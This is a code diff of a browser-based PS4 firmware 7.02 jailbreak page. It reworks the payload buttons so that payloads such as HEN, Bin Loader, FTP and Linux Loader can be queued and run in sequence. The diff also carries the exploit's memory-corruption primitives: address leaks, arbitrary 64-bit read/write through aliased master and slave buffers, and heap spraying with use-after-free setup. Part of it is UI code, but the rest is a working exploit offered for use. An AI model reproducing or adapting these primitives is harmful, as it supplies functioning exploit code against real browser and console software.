@@ -106,7 +106,7 @@ function setupRW() {
 
 	debug_log("Exploited Successfully !!");
 	
-	setTimeout(function(){document.getElementById("progress").innerHTML="PS4 Jailbreak 7.02"; }, 500);
+	setTimeout(function(){document.getElementById("progress").innerHTML="PS4 Jailbreak 7.02 - Select the Payloads in its Order of Execution and Click Run..";}, 3500);
 
 	/* Restore the overidden vtable pointer */
 	write64(guess_htmltextarea_addr, saved_vtable);
@@ -127,10 +127,16 @@ function setupRW() {
 	//startLoad();
 	document.getElementById("myProgress").remove();
 	document.getElementById('load').innerHTML='<tr>'+
-			'<td align="center" id="jailbreak" colspan="2" >'+
-			'<a href="#" class="button" onclick="load_payload(\'hen\'); return false" style="width:28%">HEN</a>&nbsp;'+
-			'<a href="#" class="button" onclick="load_payload(\'henb\'); return false" style="width:28%">HEN 2.1.3 b</a>&nbsp;'+
-			'<a href="#" class="button" onclick="load_payload(\'spoof\'); return false" style="width:28%">Spoof 9.99</a>&nbsp;'+
+			'<td align="center" colspan="2" >'+
+			'<a href="#" class="button" onclick="load_payload();" style="width:100%">Run Selected Payload(s)</a>&nbsp;'+
+			'</td>'+
+			'</tr>'+
+			'<tr><td><br/></td></tr>'+
+			'<tr>'+
+			'<td align="center" colspan="2" >'+
+			'<a href="#" id="hen" class="button" onclick="toggle_payload(\'hen\'); return false" style="width:28%">HEN</a>&nbsp;'+
+			'<a href="#" id="henb" class="button" onclick="toggle_payload(\'henb\'); return false" style="width:28%">HEN 2.1.3 b</a>&nbsp;'+
+			'<a href="#" id="spoof" class="button" onclick="toggle_payload(\'spoof\'); return false" style="width:28%">Spoof 9.99</a>&nbsp;'+
 			'</td>'+
 			'</tr>'+
 			'<tr><td><br/></td></tr>'+
@@ -138,105 +144,123 @@ function setupRW() {
 			'<td colspan="2" align="center"><hr><br></td>'+
 			'</tr>'+
 			'<tr>'+
-			'<td align="center" colspan="2"><a href="#" class="button" onclick="load_payload(\'app2usb\'); return false" style="width:43%">App2USB</a>&nbsp;'+
-			'<a href="#" class="button" onclick="load_payload(\'binloader\'); return false" style="width:43%">Bin Loader</a>&nbsp;</td>'+
+			'<td align="center" colspan="2"><a href="#" id="app2usb" class="button" onclick="toggle_payload(\'app2usb\'); return false" style="width:43%">App2USB</a>&nbsp;'+
+			'<a href="#" id="binloader" class="button" onclick="toggle_payload(\'binloader\'); return false" style="width:43%">Bin Loader</a>&nbsp;</td>'+
 			'</tr><tr><td><br/></td></tr>'+
 			'<tr>'+
-			'<td align="center" colspan="2"><a href="#" class="button" onclick="load_payload(\'disableupdates\'); return false" style="width:43%">Disable Updates</a>&nbsp;'+
-			'<a href="#" class="button" onclick="load_payload(\'enableupdates\'); return false" style="width:43%">Enable Updates</a>&nbsp;</td>'+
+			'<td align="center" colspan="2"><a href="#" id="disableupdates" class="button" onclick="toggle_payload(\'disableupdates\'); return false" style="width:43%">Disable Updates</a>&nbsp;'+
+			'<a href="#" id="enableupdates" class="button" onclick="toggle_payload(\'enableupdates\'); return false" style="width:43%">Enable Updates</a>&nbsp;</td>'+
 			'</tr><tr><td><br/></td></tr>'+
 			'<tr>'+
-			'<td align="center" colspan="2"><a href="#" class="button" onclick="load_payload(\'dumper\'); return false" style="width:43%">Dumper</a>&nbsp;'+
-			'<a href="#" class="button" onclick="load_payload(\'gtam132\'); return false" style="width:43%">GTAV M1 1.32</a>&nbsp;</td>'+
+			'<td align="center" colspan="2"><a href="#" id="dumper" class="button" onclick="toggle_payload(\'dumper\'); return false" style="width:43%">Dumper</a>&nbsp;'+
+			'<a href="#" id="gtam132" class="button" onclick="toggle_payload(\'gtam132\'); return false" style="width:43%">GTAV M1 1.32</a>&nbsp;</td>'+
 			'</tr><tr><td><br/></td></tr>'+
 			'<tr>'+
 			'<tr>'+
 			'<td align="center" colspan="2">'+
-			'<a href="#" class="button" onclick="load_payload(\'restore\'); return false" style="width:43%">Restore</a>&nbsp;'+
-			'<a href="#" class="button" onclick="load_payload(\'fix30391\'); return false" style="width:43%;border-radius: 5px 0px 0px 5px;">CE-30391-6 Fix</a>&nbsp;'+
+			'<a href="#" id="restore" class="button" onclick="toggle_payload(\'restore\'); return false" style="width:43%">Restore</a>&nbsp;'+
+			'<a href="#" id="fix30391" class="button" onclick="toggle_payload(\'fix30391\'); return false" style="width:43%;border-radius: 5px 0px 0px 5px;">CE-30391-6 Fix</a>&nbsp;'+
 			'</td>'+
 			'</tr><tr><td><br/></td></tr>'+
 			'<tr>'+
-			'<td align="center" colspan="2"><a href="#" class="button" onclick="load_payload(\'ftp\'); return false" style="width:43%">FTP</a>&nbsp;'+
-			'<a href="#" class="button" onclick="load_payload(\'backup\'); return false" style="width:43%">BackUp</a>&nbsp;</td>'+
+			'<td align="center" colspan="2"><a href="#" id="ftp" class="button" onclick="toggle_payload(\'ftp\'); return false" style="width:43%">FTP</a>&nbsp;'+
+			'<a href="#" id="backup" class="button" onclick="toggle_payload(\'backup\'); return false" style="width:43%">BackUp</a>&nbsp;</td>'+
 			'</tr><tr><td><br/></td></tr>'+
 			'<tr>'+
-			'<td align="center" colspan="2"><a href="#" class="button" onclick="load_payload(\'todex\'); return false" style="width:43%">To-DEX</a>&nbsp;'+
-			'<a href="#" class="button" onclick="load_payload(\'webrte\'); return false" style="width:43%">WebRTE</a>&nbsp;</td>'+
+			'<td align="center" colspan="2"><a href="#" id="todex" class="button" onclick="toggle_payload(\'todex\'); return false" style="width:43%">To-DEX</a>&nbsp;'+
+			'<a href="#" id="webrte" class="button" onclick="toggle_payload(\'webrte\'); return false" style="width:43%">WebRTE</a>&nbsp;</td>'+
 			'</tr><tr><td><br/></td></tr>'+
 			'<tr>'+
-			'<td align="center" colspan="2"><a href="#" class="button" onclick="load_payload(\'linuxloader\'); return false" style="width:43%">Linux Loader</a>&nbsp;'+
-			'<a href="#" class="button" onclick="load_payload(\'ps4debug\'); return false" style="width:43%">PS4 Debug</a>&nbsp;</td>'+
+			'<td align="center" colspan="2"><a href="#" id="linuxloader" class="button" onclick="toggle_payload(\'linuxloader\'); return false" style="width:43%">Linux Loader</a>&nbsp;'+
+			'<a href="#" id="ps4debug" class="button" onclick="toggle_payload(\'ps4debug\'); return false" style="width:43%">PS4 Debug</a>&nbsp;</td>'+
 			'</tr>';
 	document.getElementById("div1").remove();
 }
 
-function load_payload(pld){
-	var leak_slave = addrof(slave_b);
-	var slave_addr = read64(leak_slave.add(0x10));
+function toggle_payload(pld){
+	if(pld=="hen" || pld=="binloader"){if(confirm("HEN (or) Binloader cannot be loaded with any other payloads\nDo you still want to load this payload alone ?")){document.getElementById("pldooe").value = pld; load_payload();}}
+	else{
+		var pldooe = document.getElementById("pldooe").value;
+		var pldooe_full = document.getElementById("pldooe_full").value;
+		var pld_full = document.getElementById(pld).innerHTML + ', ';
+		pld = pld+',';
+		if(pldooe==""){pldooe=pld;pldooe_full=pld_full;}else if(pldooe.includes(pld)){pldooe=pldooe.replace(pld,"");pldooe_full=pldooe_full.replace(pld_full,"");}else{pldooe+=pld;pldooe_full+=pld_full;}
+		document.getElementById("pldooe").value = pldooe;
+		document.getElementById("pldooe_full").value = pldooe_full;
+		if(pldooe!=""){document.getElementById("progress").innerHTML="Order Of Execution - "+pldooe_full.slice(0, -2);}else{document.getElementById("progress").innerHTML="PS4 Jailbreak 7.02 - Select the Payloads in its Order of Execution and Click Run..";}
+	}
+}
 
-	og_slave_addr = new int64(slave_addr.low32(), slave_addr.hi32());
-	var leak_master = addrof(master_b);
-	write64(leak_master.add(0x10), leak_slave.add(0x10));
-	var prim = {
-		write8: function(addr, val) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
+function load_payload(){
+	var pld = document.getElementById("pldooe").value;
+	if(pld != ""){
+		var leak_slave = addrof(slave_b);
+		var slave_addr = read64(leak_slave.add(0x10));
+		og_slave_addr = new int64(slave_addr.low32(), slave_addr.hi32());
+		var leak_master = addrof(master_b);
+		write64(leak_master.add(0x10), leak_slave.add(0x10));
+		var prim = {
+			write8: function(addr, val) {
+				master_b[0] = addr.low;
+				master_b[1] = addr.hi;
 
-			if(val instanceof int64) {
-				slave_b[0] = val.low;
-				slave_b[1] = val.hi;
-			}
-			else {
+				if(val instanceof int64) {
+					slave_b[0] = val.low;
+					slave_b[1] = val.hi;
+				}
+				else {
+					slave_b[0] = val;
+					slave_b[1] = 0;
+				}
+
+				master_b[0] = og_slave_addr.low;
+				master_b[1] = og_slave_addr.hi;
+			},
+			write4: function(addr, val) {
+				master_b[0] = addr.low;
+				master_b[1] = addr.hi;
+
 				slave_b[0] = val;
-				slave_b[1] = 0;
-			}
 
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-		},
-		write4: function(addr, val) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-
-			slave_b[0] = val;
-
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-		},
-		read8: function(addr) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-			var r = new int64(slave_b[0], slave_b[1]);
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-			return r;
-		},
-		read4: function(addr) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-			var r = slave_b[0];
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-			return r;
-		},
-		leakval: function(val) {
-			g_ab_slave.leakme = val;
-			master_b[0] = g_jsview_butterfly.low32() - 0x10;
-			master_b[1] = g_jsview_butterfly.hi32();
-			var r = new int64(slave_b[0], slave_b[1]);
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-			return r;
-		},
-	};
-	window.prim = prim;
-	if(pld == 'hen'){
-		setTimeout(hen, 1000);
-	}else if(pld == 'binloader'){
-		setTimeout(binloader, 1000);
+				master_b[0] = og_slave_addr.low;
+				master_b[1] = og_slave_addr.hi;
+			},
+			read8: function(addr) {
+				master_b[0] = addr.low;
+				master_b[1] = addr.hi;
+				var r = new int64(slave_b[0], slave_b[1]);
+				master_b[0] = og_slave_addr.low;
+				master_b[1] = og_slave_addr.hi;
+				return r;
+			},
+			read4: function(addr) {
+				master_b[0] = addr.low;
+				master_b[1] = addr.hi;
+				var r = slave_b[0];
+				master_b[0] = og_slave_addr.low;
+				master_b[1] = og_slave_addr.hi;
+				return r;
+			},
+			leakval: function(val) {
+				g_ab_slave.leakme = val;
+				master_b[0] = g_jsview_butterfly.low32() - 0x10;
+				master_b[1] = g_jsview_butterfly.hi32();
+				var r = new int64(slave_b[0], slave_b[1]);
+				master_b[0] = og_slave_addr.low;
+				master_b[1] = og_slave_addr.hi;
+				return r;
+			},
+		};
+		window.prim = prim;
+		if(pld == 'hen'){
+			hen();
+		}else if(pld == 'binloader'){
+			binloader();
+		}else{
+			stage2(pld.slice(0, -1));
+		}
 	}else{
-		setTimeout(function(){ stage2(pld); }, 1000);
+		alert("Select payload(s) before clicking Run!!");
 	}
 }
 
@@ -558,10 +582,9 @@ function sprayStringImpl(start, end) {
 }
 
 function go() {
-	/* Init spray */
 	if(localStorage.isCached){
+		/* Init spray */
 		sprayHTMLTextArea();
-
 		g_input = input1;
 		/* Shape heap layout for obj. reuse */
 		prepareUAF();
